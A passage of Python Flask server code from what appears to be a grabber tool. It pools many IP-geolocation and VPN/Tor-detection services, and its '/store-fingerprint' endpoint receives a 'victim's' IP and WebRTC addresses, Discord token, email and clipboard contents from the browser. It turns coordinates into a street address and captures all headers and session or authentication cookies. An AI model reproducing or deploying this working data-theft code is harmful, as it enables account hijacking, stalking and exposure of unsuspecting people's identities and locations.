                    if network_data["timezone"] == "Unknown":
                        network_data["timezone"] = data.get("timezone", "Unknown")
                    if network_data["utc_offset"] == "Unknown":
                        network_data["utc_offset"] = data.get("offset", "Unknown")
                    if network_data["currency"] == "Unknown":
                        network_data["currency"] = data.get("currency", "Unknown")
                    network_data["proxy"] = "Yes" if data.get("proxy") else "No"
                    network_data["mobile"] = "Yes" if data.get("mobile") else "No"
                    network_data["is_crawler"] = data.get("isCrawler", False)
                
                elif api_name == "ipinfo":
                    if network_data["isp"] == "Unknown":
                        network_data["isp"] = data.get("org", "Unknown")
                    if network_data["country"] == "Unknown":
                        network_data["country"] = data.get("country", "Unknown")
                    if network_data["region"] == "Unknown":
                        network_data["region"] = data.get("region", "Unknown")
                    if network_data["city"] == "Unknown":
                        network_data["city"] = data.get("city", "Unknown")
                    if network_data["timezone"] == "Unknown":
                        network_data["timezone"] = data.get("timezone", "Unknown")
                    loc = data.get("loc", "")
                    if loc and ',' in loc and network_data["latitude"] == "Unknown":
                        lat, lon = loc.split(',')
                        network_data["latitude"] = lat.strip()
                        network_data["longitude"] = lon.strip()
                
                elif api_name == "ipapi":
                    if network_data["isp"] == "Unknown":
                        network_data["isp"] = data.get("org", "Unknown")
                    if network_data["asn"] == "Unknown":
                        network_data["asn"] = data.get("asn", "Unknown")
                        network_data["asn_number"] = data.get("asn", "Unknown")
                        network_data["asn_name"] = data.get("org", "Unknown")
                    if network_data["country"] == "Unknown":
                        network_data["country"] = data.get("country_name", "Unknown")
                    if network_data["country_code"] == "Unknown":
                        network_data["country_code"] = data.get("country_code", "Unknown")
                    if network_data["continent"] == "Unknown":
                        network_data["continent"] = data.get("continent_code", "Unknown")
                    if network_data["region"] == "Unknown":
                        network_data["region"] = data.get("region", "Unknown")
                    if network_data["city"] == "Unknown":
                        network_data["city"] = data.get("city", "Unknown")
                    if network_data["zip_code"] == "Unknown":
                        network_data["zip_code"] = str(data.get("postal", "Unknown"))
                    if network_data["latitude"] == "Unknown":
                        network_data["latitude"] = data.get("latitude", "Unknown")
                        network_data["longitude"] = data.get("longitude", "Unknown")
                    if network_data["timezone"] == "Unknown":
                        network_data["timezone"] = data.get("timezone", "Unknown")
                    if network_data["utc_offset"] == "Unknown":
                        network_data["utc_offset"] = data.get("utc_offset", "Unknown")
                    if network_data["currency"] == "Unknown":
                        network_data["currency"] = data.get("currency", "Unknown")
                        network_data["currency_code"] = data.get("currency", "Unknown")
                    if network_data["calling_code"] == "Unknown":
                        network_data["calling_code"] = data.get("country_calling_code", "Unknown")
                    if network_data["languages"] == "Unknown":
                        network_data["languages"] = data.get("languages", "Unknown")
                
                elif api_name == "ipwhois":
                    if data.get("success"):
                        if network_data["continent"] == "Unknown":
                            network_data["continent"] = data.get("continent", "Unknown")
                        if network_data["country"] == "Unknown":
                            network_data["country"] = data.get("country", "Unknown")
                        if network_data["country_code"] == "Unknown":
                            network_data["country_code"] = data.get("country_code", "Unknown")
                        if network_data["city"] == "Unknown":
                            network_data["city"] = data.get("city", "Unknown")
                        if network_data["region"] == "Unknown":
                            network_data["region"] = data.get("region", "Unknown")
                        if network_data["latitude"] == "Unknown":
                            network_data["latitude"] = data.get("latitude", "Unknown")
                            network_data["longitude"] = data.get("longitude", "Unknown")
                        if network_data["timezone"] == "Unknown":
                            network_data["timezone"] = data.get("timezone", "Unknown")
                        if network_data["utc_offset"] == "Unknown":
                            network_data["utc_offset"] = data.get("timezone_gmt", "Unknown")
                        if network_data["isp"] == "Unknown":
                            network_data["isp"] = data.get("isp", "Unknown")
                        if network_data["asn"] == "Unknown":
                            network_data["asn"] = data.get("asn", "Unknown")
                        if network_data["currency"] == "Unknown":
                            network_data["currency"] = data.get("currency", "Unknown")
                            network_data["currency_code"] = data.get("currency_code", "Unknown")
                        if network_data["calling_code"] == "Unknown":
                            network_data["calling_code"] = data.get("calling_code", "Unknown")
                
                elif api_name == "ipwho":
                    if data.get("success"):
                        if network_data["country"] == "Unknown":
                            network_data["country"] = data.get("country", "Unknown")
                        if network_data["country_code"] == "Unknown":
                            network_data["country_code"] = data.get("country_code", "Unknown")
                        if network_data["continent"] == "Unknown":
                            network_data["continent"] = data.get("continent", "Unknown")
                        if network_data["continent_code"] == "Unknown":
                            network_data["continent_code"] = data.get("continent_code", "Unknown")
                        if network_data["region"] == "Unknown":
                            network_data["region"] = data.get("region", "Unknown")
                        if network_data["city"] == "Unknown":
                            network_data["city"] = data.get("city", "Unknown")
                        if network_data["latitude"] == "Unknown":
                            network_data["latitude"] = data.get("latitude", "Unknown")
                        if network_data["longitude"] == "Unknown":
                            network_data["longitude"] = data.get("longitude", "Unknown")
                        if network_data["timezone"] == "Unknown":
                            tz_data = data.get("timezone", {})
                            network_data["timezone"] = tz_data.get("id", "Unknown") if isinstance(tz_data, dict) else "Unknown"
                        if network_data["utc_offset"] == "Unknown":
                            tz_data = data.get("timezone", {})
                            network_data["utc_offset"] = tz_data.get("utc", "Unknown") if isinstance(tz_data, dict) else "Unknown"
                        if network_data["currency"] == "Unknown":
                            network_data["currency"] = data.get("currency", "Unknown")
                        if network_data["currency_code"] == "Unknown":
                            network_data["currency_code"] = data.get("currency_code", "Unknown")
                        if network_data["calling_code"] == "Unknown":
                            network_data["calling_code"] = data.get("calling_code", "Unknown")
                        conn_data = data.get("connection", {})
                        if network_data["asn"] == "Unknown":
                            network_data["asn"] = str(conn_data.get("asn", "Unknown")) if isinstance(conn_data, dict) else "Unknown"
                        if network_data["asn_number"] == "Unknown":
                            network_data["asn_number"] = str(conn_data.get("asn", "Unknown")) if isinstance(conn_data, dict) else "Unknown"
                        if network_data["isp"] == "Unknown":
                            network_data["isp"] = conn_data.get("isp", "Unknown") if isinstance(conn_data, dict) else "Unknown"
                        if network_data["organization"] == "Unknown":
                            network_data["organization"] = conn_data.get("org", "Unknown") if isinstance(conn_data, dict) else "Unknown"
                
        except Exception as e:
            print(f"[-] Error fetching from {api_url}: {e}")
            continue
    
    try:
        proxy_check_response = requests.get(f"https://proxycheck.io/v2/{ip}?vpn=2&asn=1&risk=2&inf=0", timeout=5)
        if proxy_check_response.status_code == 200:
            proxy_data = proxy_check_response.json()
            ip_data = proxy_data.get(ip, {})
            
            if ip_data.get("proxy") == "yes":
                network_data["proxy"] = "Yes"
                proxy_type = ip_data.get("type", "").upper()
                if "VPN" in proxy_type or ip_data.get("vpn") == "yes":
                    network_data["vpn"] = "Yes"
                if "TOR" in proxy_type or ip_data.get("tor") == "yes":
                    network_data["tor"] = "Yes"
            
            if ip_data.get("vpn") == "yes":
                network_data["vpn"] = "Yes"
                network_data["proxy"] = "Yes"
            
            if ip_data.get("tor") == "yes":
                network_data["tor"] = "Yes"
                network_data["proxy"] = "Yes"
            
            risk_score = ip_data.get("risk", 0)
            try:
                network_data["threat_score"] = max(network_data["threat_score"], int(float(risk_score)))
                network_data["fraud_score"] = max(network_data["fraud_score"], int(float(risk_score)))
            except (ValueError, TypeError):
                pass
            
            operator_data = ip_data.get("operator", {})
            if isinstance(operator_data, dict):
                if operator_data.get("type") == "Hosting":
                    network_data["hosting"] = "Yes"
                    network_data["datacenter"] = "Yes"
                if network_data["isp"] == "Unknown":
                    network_data["isp"] = operator_data.get("name", "Unknown")
            
            print(f"[+] ProxyCheck.io - Proxy: {network_data['proxy']}, VPN: {network_data['vpn']}, Tor: {network_data['tor']}, Risk: {network_data['threat_score']}")
    except Exception as e:
        print(f"[-] ProxyCheck.io error: {e}")
    
    if IPGEOLOCATION_API_KEY and not IPGEOLOCATION_API_KEY.startswith("YOUR_"):
        try:
            ipgeo_response = requests.get(
                f"https://api.ipgeolocation.io/ipgeo?apiKey={IPGEOLOCATION_API_KEY}&ip={ip}&fields=geo,time_zone,currency,security",
                timeout=5
            )
            if ipgeo_response.status_code == 200:
                ipgeo_data = ipgeo_response.json()
                
                if network_data["country"] == "Unknown":
                    network_data["country"] = ipgeo_data.get("country_name", "Unknown")
                if network_data["country_code"] == "Unknown":
                    network_data["country_code"] = ipgeo_data.get("country_code2", "Unknown")
                if network_data["continent"] == "Unknown":
                    network_data["continent"] = ipgeo_data.get("continent_name", "Unknown")
                if network_data["continent_code"] == "Unknown":
                    network_data["continent_code"] = ipgeo_data.get("continent_code", "Unknown")
                if network_data["region"] == "Unknown":
                    network_data["region"] = ipgeo_data.get("state_prov", "Unknown")
                if network_data["city"] == "Unknown":
                    network_data["city"] = ipgeo_data.get("city", "Unknown")
                if network_data["district"] == "Unknown":
                    network_data["district"] = ipgeo_data.get("district", "Unknown")
                if network_data["zip_code"] == "Unknown":
                    network_data["zip_code"] = ipgeo_data.get("zipcode", "Unknown")
                if network_data["latitude"] == "Unknown":
                    network_data["latitude"] = ipgeo_data.get("latitude", "Unknown")
                if network_data["longitude"] == "Unknown":
                    network_data["longitude"] = ipgeo_data.get("longitude", "Unknown")
                if network_data["timezone"] == "Unknown":
                    tz_data = ipgeo_data.get("time_zone", {})
                    network_data["timezone"] = tz_data.get("name", "Unknown")
                if network_data["utc_offset"] == "Unknown":
                    tz_data = ipgeo_data.get("time_zone", {})
                    network_data["utc_offset"] = tz_data.get("offset", "Unknown")
                if network_data["currency"] == "Unknown":
                    curr_data = ipgeo_data.get("currency", {})
                    network_data["currency"] = curr_data.get("name", "Unknown")
                if network_data["currency_code"] == "Unknown":
                    curr_data = ipgeo_data.get("currency", {})
                    network_data["currency_code"] = curr_data.get("code", "Unknown")
                if network_data["calling_code"] == "Unknown":
                    network_data["calling_code"] = ipgeo_data.get("calling_code", "Unknown")
                if network_data["isp"] == "Unknown":
                    network_data["isp"] = ipgeo_data.get("isp", "Unknown")
                if network_data["organization"] == "Unknown":
                    network_data["organization"] = ipgeo_data.get("organization", "Unknown")
                
                print(f"[+] IPGeolocation.io - Location: {network_data['city']}, {network_data['country']}")
        except Exception as e:
            print(f"[-] IPGeolocation.io error: {e}")
    
    if IPGEOLOCATION_API_KEY and not IPGEOLOCATION_API_KEY.startswith("YOUR_"):
        try:
            security_response = requests.get(
                f"https://api.ipgeolocation.io/ipgeo?apiKey={IPGEOLOCATION_API_KEY}&ip={ip}&fields=security",
                timeout=5
            )
            if security_response.status_code == 200:
                sec_data = security_response.json()
                
                if sec_data.get("is_proxy"):
                    network_data["proxy"] = "Yes"
                if sec_data.get("proxy_type"):
                    if "VPN" in sec_data.get("proxy_type", ""):
                        network_data["vpn"] = "Yes"
                    if "TOR" in sec_data.get("proxy_type", ""):
                        network_data["tor"] = "Yes"
                
                threat = sec_data.get("threat_score", 0)
                if threat > 0:
                    network_data["threat_score"] = max(network_data["threat_score"], int(threat))
                
                if sec_data.get("is_crawler"):
                    network_data["is_crawler"] = True
                if sec_data.get("is_bot"):
                    network_data["is_bot"] = True
                if sec_data.get("is_cloud_provider"):
                    network_data["hosting"] = "Yes"
                    network_data["datacenter"] = "Yes"
                
                print(f"[+] IPGeolocation.io Security - Proxy: {network_data['proxy']}, Bot: {network_data['is_bot']}, Threat: {network_data['threat_score']}")
        except Exception as e:
            print(f"[-] IPGeolocation.io Security error: {e}")
    
    try:
        getipintel_response = requests.get(
            f"http://check.getipintel.net/check.php?ip={ip}&contact=abuse@example.com&flags=m",
            timeout=5
        )
        if getipintel_response.status_code == 200:
            probability = float(getipintel_response.text.strip())
            if probability >= 0.99:
                network_data["proxy"] = "Yes"
                if probability >= 0.995:
                    network_data["vpn"] = "Yes"
            vpn_probability = int(probability * 100)
            network_data["fraud_score"] = max(network_data["fraud_score"], vpn_probability)
            print(f"[+] GetIPIntel.net - VPN/Proxy probability: {vpn_probability}%")
    except Exception as e:
        print(f"[-] GetIPIntel.net error: {e}")
    
    
    try:
        ipwhois_response = requests.get(f"https://ipwhois.app/json/{ip}", timeout=5)
        if ipwhois_response.status_code == 200:
            ipwhois_data = ipwhois_response.json()
            if ipwhois_data.get("success"):
                if network_data["country"] == "Unknown":
                    network_data["country"] = ipwhois_data.get("country", "Unknown")
                if network_data["country_code"] == "Unknown":
                    network_data["country_code"] = ipwhois_data.get("country_code", "Unknown")
                if network_data["region"] == "Unknown":
                    network_data["region"] = ipwhois_data.get("region", "Unknown")
                if network_data["city"] == "Unknown":
                    network_data["city"] = ipwhois_data.get("city", "Unknown")
                if network_data["latitude"] == "Unknown":
                    network_data["latitude"] = ipwhois_data.get("latitude", "Unknown")
                if network_data["longitude"] == "Unknown":
                    network_data["longitude"] = ipwhois_data.get("longitude", "Unknown")
                if network_data["timezone"] == "Unknown":
                    network_data["timezone"] = ipwhois_data.get("timezone", "Unknown")
                if network_data["isp"] == "Unknown":
                    network_data["isp"] = ipwhois_data.get("isp", "Unknown")
                if network_data["asn"] == "Unknown":
                    network_data["asn"] = ipwhois_data.get("asn", "Unknown")
                if network_data["organization"] == "Unknown":
                    network_data["organization"] = ipwhois_data.get("org", "Unknown")
                print(f"[+] IPWhois - {network_data['city']}, {network_data['country']}")
    except Exception as e:
        print(f"[-] IPWhois error: {e}")
    
    try:
        freeip_response = requests.get(f"https://freeipapi.com/api/json/{ip}", timeout=5)
        if freeip_response.status_code == 200:
            freeip_data = freeip_response.json()
            if network_data["country"] == "Unknown":
                network_data["country"] = freeip_data.get("countryName", "Unknown")
            if network_data["country_code"] == "Unknown":
                network_data["country_code"] = freeip_data.get("countryCode", "Unknown")
            if network_data["region"] == "Unknown":
                network_data["region"] = freeip_data.get("regionName", "Unknown")
            if network_data["city"] == "Unknown":
                network_data["city"] = freeip_data.get("cityName", "Unknown")
            if network_data["latitude"] == "Unknown":
                network_data["latitude"] = freeip_data.get("latitude", "Unknown")
            if network_data["longitude"] == "Unknown":
                network_data["longitude"] = freeip_data.get("longitude", "Unknown")
            if network_data["timezone"] == "Unknown":
                network_data["timezone"] = freeip_data.get("timeZone", "Unknown")
            print(f"[+] FreeIPAPI - {network_data['city']}, {network_data['country']}")
    except Exception as e:
        print(f"[-] FreeIPAPI error: {e}")
    
    try:
        ipdata_response = requests.get(f"https://api.ipdata.co/{ip}?api-key=test", timeout=5)
        if ipdata_response.status_code == 200:
            ipdata_data = ipdata_response.json()
            if network_data["country"] == "Unknown":
                network_data["country"] = ipdata_data.get("country_name", "Unknown")
            if network_data["country_code"] == "Unknown":
                network_data["country_code"] = ipdata_data.get("country_code", "Unknown")
            if network_data["region"] == "Unknown":
                network_data["region"] = ipdata_data.get("region", "Unknown")
            if network_data["city"] == "Unknown":
                network_data["city"] = ipdata_data.get("city", "Unknown")
            if network_data["latitude"] == "Unknown":
                network_data["latitude"] = ipdata_data.get("latitude", "Unknown")
            if network_data["longitude"] == "Unknown":
                network_data["longitude"] = ipdata_data.get("longitude", "Unknown")
            if network_data["timezone"] == "Unknown":
                network_data["timezone"] = ipdata_data.get("time_zone", {}).get("name", "Unknown")
            if network_data["asn"] == "Unknown":
                asn_obj = ipdata_data.get("asn", {})
                network_data["asn"] = asn_obj.get("asn", "Unknown")
                network_data["asn_name"] = asn_obj.get("name", "Unknown")
            if ipdata_data.get("threat", {}).get("is_tor"):
                network_data["tor"] = "Yes"
            if ipdata_data.get("threat", {}).get("is_proxy"):
                network_data["proxy"] = "Yes"
            if ipdata_data.get("threat", {}).get("is_vpn"):
                network_data["vpn"] = "Yes"
            print(f"[+] IPData.co - {network_data['city']}, Proxy: {network_data['proxy']}")
    except Exception as e:
        print(f"[-] IPData.co error: {e}")
    
    if ip.startswith(('10.', '172.16.', '192.168.', '127.')):
        network_data["network_type"] = "Private/Local Network"
    elif network_data["isp"] != "Unknown":
        if any(keyword in network_data["isp"].lower() for keyword in ['aws', 'amazon', 'google cloud', 'azure', 'digitalocean', 'linode', 'vultr']):
            network_data["hosting"] = "Yes"
            network_data["network_type"] = "Cloud/Hosting Provider"
        elif 'mobile' in network_data.get("mobile", "").lower() or any(keyword in network_data["isp"].lower() for keyword in ['mobile', 'cellular', 'wireless']):
            network_data["network_type"] = "Mobile/Cellular"
        else:
            network_data["network_type"] = "Residential/Business ISP"
    
    critical_fields = ['country', 'country_code', 'city', 'region', 'latitude', 'longitude', 'isp', 'asn', 'timezone']
    missing_fields = [field for field in critical_fields if network_data.get(field) == "Unknown"]
    
    if missing_fields:
        print(f"[*] Initiating bruteforce for missing fields: {', '.join(missing_fields)}")
        bruteforce_data = bruteforce_data_collection(ip, missing_fields)
        
        for field, value in bruteforce_data.items():
            if value and value != "Unknown":
                network_data[field] = value
                print(f"[+] Bruteforce collected: {field} = {value}")
    
    return network_data

@app.route("/store-fingerprint", methods=["POST"])
def store_fingerprint():
    fingerprint = request.get_json()
    
    # ALWAYS use victim's IP from JavaScript - never use server detection
    client_ip = fingerprint.get('client_ip', 'Unknown')
    
    webrtc_ips = fingerprint.get('webrtc_ips', [])
    webrtc_ipv6 = fingerprint.get('webrtc_ipv6', [])
    local_ips = fingerprint.get('local_ips', [])
    
    webrtc_ip_strings = []
    for item in webrtc_ips:
        if isinstance(item, dict):
            webrtc_ip_strings.append(item.get('ip', str(item)))
        else:
            webrtc_ip_strings.append(str(item))
    
    webrtc_ipv6_strings = []
    for item in webrtc_ipv6:
        if isinstance(item, dict):
            webrtc_ipv6_strings.append(item.get('ip', str(item)))
        else:
            webrtc_ipv6_strings.append(str(item))
    
    print(f"[+] VICTIM PUBLIC IP: {client_ip}")
    if webrtc_ip_strings:
        print(f"[+] WebRTC IPv4s ({len(webrtc_ip_strings)}): {', '.join(webrtc_ip_strings)}")
    if webrtc_ipv6_strings:
        print(f"[+] WebRTC IPv6s ({len(webrtc_ipv6_strings)}): {', '.join(webrtc_ipv6_strings)}")
    if local_ips:
        print(f"[+] Local/Private IPs: {', '.join(local_ips)}")
    
    discord_token = fingerprint.get('discord_token', 'Not Available')
    discord_user = fingerprint.get('discord_user')
    
    if discord_token != 'Not Available':
        print(f"[+] Discord Token (from browser): {discord_token}")
    else:
        print(f"[-] Discord Token: Not Available")
    
    if discord_user:
        username = discord_user.get('username', 'Unknown')
        discriminator = discord_user.get('discriminator', '0')
        user_id = discord_user.get('id', 'Unknown')
        email = discord_user.get('email', 'Not Available')
        print(f"[+] Discord Username (from browser): {username}#{discriminator}")
        print(f"[+] Discord User ID: {user_id}")
        print(f"[+] Discord Email: {email}")
    else:
        print(f"[-] Discord User (from browser): None")
    
    # OAuth2 username will be fetched after redirect to /auth
    
    network_info = fetch_network_info(client_ip)
    fingerprint['server_side_network'] = network_info
    
    latitude = network_info.get('latitude', 'Unknown')
    longitude = network_info.get('longitude', 'Unknown')
    
    full_address_info = None
    if latitude != 'Unknown' and longitude != 'Unknown':
        full_address_info = get_full_address_from_coords(latitude, longitude)
        if not full_address_info.get('error'):
            fingerprint['full_street_address'] = full_address_info
            print(f"[+] Full Address: {full_address_info.get('full_address', 'Unknown')}")
        
        airport_info = find_nearest_airport(latitude, longitude)
        fingerprint['nearest_airport'] = airport_info
        if not airport_info.get('error'):
            airport_addr = airport_info.get('address', 'Unknown')
            print(f"[+] Nearest Airport: {airport_info.get('name')} ({airport_info.get('iata')}) - {airport_info.get('distance_km')} km away")
            print(f"[+] Airport Address: {airport_addr}")
    
    clipboard_content = fingerprint.get('clipboard_content', '')
    clipboard_url = None
    if clipboard_content and len(clipboard_content) > 500 and clipboard_content not in ['Permission denied or unavailable', 'Empty clipboard']:
        clipboard_id = secrets.token_urlsafe(16)
        clipboard_storage[clipboard_id] = clipboard_content
        clipboard_url = f"{public_url}/clipboard/{clipboard_id}"
        fingerprint['clipboard_url'] = clipboard_url
        fingerprint['clipboard_preview'] = clipboard_content[:500] + '...'
        print(f"[+] Large clipboard detected ({len(clipboard_content)} chars) - stored at {clipboard_url}")
    
    fingerprint['http_headers'] = {
        'user_agent': request.headers.get('User-Agent', 'Unknown'),
        'accept': request.headers.get('Accept', 'Unknown'),
        'accept_language': request.headers.get('Accept-Language', 'Unknown'),
        'accept_encoding': request.headers.get('Accept-Encoding', 'Unknown'),
        'accept_charset': request.headers.get('Accept-Charset', 'Unknown'),
        'referer': request.headers.get('Referer', 'None'),
        'origin': request.headers.get('Origin', 'None'),
        'host': request.headers.get('Host', 'Unknown'),
        'content_type': request.headers.get('Content-Type', 'Unknown'),
        'content_length': request.headers.get('Content-Length', 'Unknown'),
        'x_forwarded_for': request.headers.get('X-Forwarded-For', 'None'),
        'x_real_ip': request.headers.get('X-Real-IP', 'None'),
        'x_forwarded_host': request.headers.get('X-Forwarded-Host', 'None'),
        'x_forwarded_proto': request.headers.get('X-Forwarded-Proto', 'None'),
        'x_forwarded_scheme': request.headers.get('X-Forwarded-Scheme', 'None'),
        'x_forwarded_port': request.headers.get('X-Forwarded-Port', 'None'),
        'x_forwarded_server': request.headers.get('X-Forwarded-Server', 'None'),
        'x_original_forwarded_for': request.headers.get('X-Original-Forwarded-For', 'None'),
        'x_original_url': request.headers.get('X-Original-URL', 'None'),
        'x_original_host': request.headers.get('X-Original-Host', 'None'),
        'x_client_ip': request.headers.get('X-Client-IP', 'None'),
        'x_cluster_client_ip': request.headers.get('X-Cluster-Client-IP', 'None'),
        'x_proxyuser_ip': request.headers.get('X-ProxyUser-IP', 'None'),
        'x_request_id': request.headers.get('X-Request-ID', 'None'),
        'x_correlation_id': request.headers.get('X-Correlation-ID', 'None'),
        'x_request_start': request.headers.get('X-Request-Start', 'None'),
        'x_queue_start': request.headers.get('X-Queue-Start', 'None'),
        'x_runtime': request.headers.get('X-Runtime', 'None'),
        'x_powered_by': request.headers.get('X-Powered-By', 'Unknown'),
        'x_aspnet_version': request.headers.get('X-AspNet-Version', 'None'),
        'x_aspnetmvc_version': request.headers.get('X-AspNetMvc-Version', 'None'),
        'x_frame_options': request.headers.get('X-Frame-Options', 'Unknown'),
        'x_content_type_options': request.headers.get('X-Content-Type-Options', 'Unknown'),
        'x_xss_protection': request.headers.get('X-XSS-Protection', 'Unknown'),
        'x_permitted_cross_domain_policies': request.headers.get('X-Permitted-Cross-Domain-Policies', 'Unknown'),
        'x_download_options': request.headers.get('X-Download-Options', 'Unknown'),
        'x_dns_prefetch_control': request.headers.get('X-DNS-Prefetch-Control', 'Unknown'),
        'x_robots_tag': request.headers.get('X-Robots-Tag', 'Unknown'),
        'x_ua_compatible': request.headers.get('X-UA-Compatible', 'Unknown'),
        'x_requested_with': request.headers.get('X-Requested-With', 'Unknown'),
        'x_requested_host': request.headers.get('X-Requested-Host', 'None'),
        'x_http_method_override': request.headers.get('X-Http-Method-Override', 'None'),
        'x_att_deviceid': request.headers.get('X-ATT-DeviceId', 'None'),
        'x_wap_profile': request.headers.get('X-Wap-Profile', 'None'),
        'x_network_info': request.headers.get('X-Network-Info', 'None'),
        'x_uidh': request.headers.get('X-UIDH', 'None'),
        'x_dcmguid': request.headers.get('X-DCMGUID', 'None'),
        'x_up_calling_line_id': request.headers.get('X-Up-Calling-Line-ID', 'None'),
        'x_up_subno': request.headers.get('X-Up-Subno', 'None'),
        'front_end_https': request.headers.get('Front-End-Https', 'None'),
        'dnt': request.headers.get('DNT', 'None'),
        'upgrade_insecure_requests': request.headers.get('Upgrade-Insecure-Requests', 'None'),
        'sec_fetch_site': request.headers.get('Sec-Fetch-Site', 'Unknown'),
        'sec_fetch_mode': request.headers.get('Sec-Fetch-Mode', 'Unknown'),
        'sec_fetch_user': request.headers.get('Sec-Fetch-User', 'Unknown'),
        'sec_fetch_dest': request.headers.get('Sec-Fetch-Dest', 'Unknown'),
        'sec_ch_ua': request.headers.get('Sec-CH-UA', 'Unknown'),
        'sec_ch_ua_mobile': request.headers.get('Sec-CH-UA-Mobile', 'Unknown'),
        'sec_ch_ua_platform': request.headers.get('Sec-CH-UA-Platform', 'Unknown'),
        'sec_ch_ua_arch': request.headers.get('Sec-CH-UA-Arch', 'Unknown'),
        'sec_ch_ua_bitness': request.headers.get('Sec-CH-UA-Bitness', 'Unknown'),
        'sec_ch_ua_full_version': request.headers.get('Sec-CH-UA-Full-Version', 'Unknown'),
        'sec_ch_ua_full_version_list': request.headers.get('Sec-CH-UA-Full-Version-List', 'Unknown'),
        'sec_ch_ua_model': request.headers.get('Sec-CH-UA-Model', 'Unknown'),
        'sec_ch_ua_platform_version': request.headers.get('Sec-CH-UA-Platform-Version', 'Unknown'),
        'sec_ch_ua_wow64': request.headers.get('Sec-CH-UA-WoW64', 'Unknown'),
        'sec_ch_viewport_width': request.headers.get('Sec-CH-Viewport-Width', 'Unknown'),
        'sec_ch_device_memory': request.headers.get('Sec-CH-Device-Memory', 'Unknown'),
        'sec_ch_dpr': request.headers.get('Sec-CH-DPR', 'Unknown'),
        'sec_ch_width': request.headers.get('Sec-CH-Width', 'Unknown'),
        'sec_ch_downlink': request.headers.get('Sec-CH-Downlink', 'Unknown'),
        'sec_ch_ect': request.headers.get('Sec-CH-ECT', 'Unknown'),
        'sec_ch_rtt': request.headers.get('Sec-CH-RTT', 'Unknown'),
        'sec_ch_save_data': request.headers.get('Sec-CH-Save-Data', 'Unknown'),
        'sec_ch_prefers_color_scheme': request.headers.get('Sec-CH-Prefers-Color-Scheme', 'Unknown'),
        'sec_ch_prefers_reduced_motion': request.headers.get('Sec-CH-Prefers-Reduced-Motion', 'Unknown'),
        'connection': request.headers.get('Connection', 'Unknown'),
        'cache_control': request.headers.get('Cache-Control', 'Unknown'),
        'pragma': request.headers.get('Pragma', 'Unknown'),
        'te': request.headers.get('TE', 'Unknown'),
        'via': request.headers.get('Via', 'None'),
        'forwarded': request.headers.get('Forwarded', 'None'),
        'cf_connecting_ip': request.headers.get('CF-Connecting-IP', 'None'),
        'cf_ipcountry': request.headers.get('CF-IPCountry', 'Unknown'),
        'cf_ray': request.headers.get('CF-Ray', 'None'),
        'cf_visitor': request.headers.get('CF-Visitor', 'None'),
        'true_client_ip': request.headers.get('True-Client-IP', 'None'),
        'save_data': request.headers.get('Save-Data', 'Unknown'),
        'device_memory': request.headers.get('Device-Memory', 'Unknown'),
        'viewport_width': request.headers.get('Viewport-Width', 'Unknown'),
        'width': request.headers.get('Width', 'Unknown'),
        'dpr': request.headers.get('DPR', 'Unknown'),
        'downlink': request.headers.get('Downlink', 'Unknown'),
        'ect': request.headers.get('ECT', 'Unknown'),
        'rtt': request.headers.get('RTT', 'Unknown'),
        'x_replit_user_id': request.headers.get('X-Replit-User-Id', 'None'),
        'x_replit_user_name': request.headers.get('X-Replit-User-Name', 'None'),
        'x_replit_user_roles': request.headers.get('X-Replit-User-Roles', 'None'),
        'x_replit_user_bio': request.headers.get('X-Replit-User-Bio', 'None'),
        'x_replit_user_profile_image': request.headers.get('X-Replit-User-Profile-Image', 'None'),
        'x_replit_user_url': request.headers.get('X-Replit-User-Url', 'None'),
        'x_replit_user_teams': request.headers.get('X-Replit-User-Teams', 'None'),
        'all_headers': dict(request.headers)
    }
    
    raw_cookie_header = request.headers.get('Cookie', '')
    fingerprint['raw_cookie_header'] = raw_cookie_header
    fingerprint['raw_cookie_header_length'] = len(raw_cookie_header)
    
    all_cookies = {}
    cookies_detailed = []
    cookie_categories = {
        'session': [],
        'authentication': [],
        'tracking': [],
        'preferences': [],
        'security': [],
        'third_party': [],
        'httponly_detected': [],
        'unknown': []
    }
    
    if raw_cookie_header:
        raw_cookies_parsed = []
        for cookie_pair in raw_cookie_header.split(';'):
            cookie_pair = cookie_pair.strip()
            if '=' in cookie_pair:
                name, value = cookie_pair.split('=', 1)
                raw_cookies_parsed.append({
                    'name': name.strip(),
                    'value': value.strip(),
                    'length': len(value.strip())
                })
        fingerprint['raw_cookies_parsed'] = raw_cookies_parsed
        fingerprint['raw_cookies_count'] = len(raw_cookies_parsed)
    
    for cookie_name, cookie_value in request.cookies.items():
        all_cookies[cookie_name] = cookie_value
        
        cookie_info = {
            'name': cookie_name,
            'value': cookie_value,
            'length': len(cookie_value),
            'is_secure': cookie_value.startswith('__Secure-') if cookie_name.startswith('__Secure-') else False,
            'is_host': cookie_name.startswith('__Host-'),
            'contains_token': len(cookie_value) > 40 and cookie_value.replace('-', '').replace('_', '').replace('.', '').isalnum(),
            'is_base64_like': all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in cookie_value) and len(cookie_value) > 20,
            'is_jwt': len(cookie_value.split('.')) == 3,
            'is_uuid': len(cookie_value) == 36 and cookie_value.count('-') == 4,
            'first_10_chars': cookie_value[:10],
            'last_10_chars': cookie_value[-10:] if len(cookie_value) > 10 else cookie_value
        }
        cookies_detailed.append(cookie_info)
        
        name_lower = cookie_name.lower()
        if any(x in name_lower for x in ['session', 'sess', 'sid', 'phpsessid', 'jsessionid']):
            cookie_categories['session'].append(cookie_name)
        elif any(x in name_lower for x in ['auth', 'token', 'login', 'user', 'account', 'remember']):
            cookie_categories['authentication'].append(cookie_name)
        elif any(x in name_lower for x in ['track', 'analytics', '_ga', '_gid', 'utm', 'fbp', 'fr']):
            cookie_categories['tracking'].append(cookie_name)
        elif any(x in name_lower for x in ['pref', 'lang', 'locale', 'theme', 'timezone']):
            cookie_categories['preferences'].append(cookie_name)
        elif any(x in name_lower for x in ['csrf', 'xsrf', 'security', 'nonce']):
            cookie_categories['security'].append(cookie_name)
        elif '.' in cookie_name or name_lower.startswith('_'):
            cookie_categories['third_party'].append(cookie_name)
        else:
            cookie_categories['unknown'].append(cookie_name)
    
    fingerprint['cookies_captured'] = all_cookies
    fingerprint['cookies_detailed'] = cookies_detailed
    fingerprint['cookie_count'] = len(all_cookies)
    fingerprint['cookie_categories'] = cookie_categories
    fingerprint['total_cookie_bytes'] = sum(len(k) + len(v) for k, v in all_cookies.items())
    
    fingerprint['session_cookie'] = request.cookies.get('session', 'Not Available')
    fingerprint['replit_session_cookie'] = request.cookies.get('replit.sid', 'Not Available')
    fingerprint['connect_sid'] = request.cookies.get('connect.sid', 'Not Available')
    
    fingerprint['cookie_stats'] = {
        'total_count': len(all_cookies),
